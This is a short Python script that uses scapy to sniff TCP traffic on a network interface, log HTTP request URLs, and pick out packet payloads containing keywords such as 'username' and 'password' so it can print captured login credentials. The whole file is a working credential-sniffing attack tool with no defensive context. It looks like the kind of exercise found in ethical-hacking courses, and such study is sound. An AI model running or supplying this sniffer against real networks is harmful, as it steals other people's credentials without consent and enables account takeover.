#!usr/bin/env python
#Router login pages use MD5 hashes for password and usernames

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
   scapy.sniff(iface=interface,store=False,prn=sniffed_packet,filter="tcp")

def get_url(packet):
   return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path  # Host and Path field of http packet has url


def get_login_info(packet):
   if packet.haslayer(scapy.Raw):
           load = packet[scapy.Raw].load    # load field of http packet has possible username and password
           keywords=["username","login","password","user","WebLoginhiddenUsername","WebLoginhiddenPassword"]
           for key in keywords:
              if key in load:
                 return load

def sniffed_packet(packet):
   if packet.haslayer(http.HTTPRequest):
       url = get_url(packet)
       print("[+] HTTP Requests >> " + url)
       log_info = get_login_info(packet)
       if log_info:
          print("\n\n[+] Posssible Login Info >> " + log_info +"\n\n") 
                        

sniff("eth0")
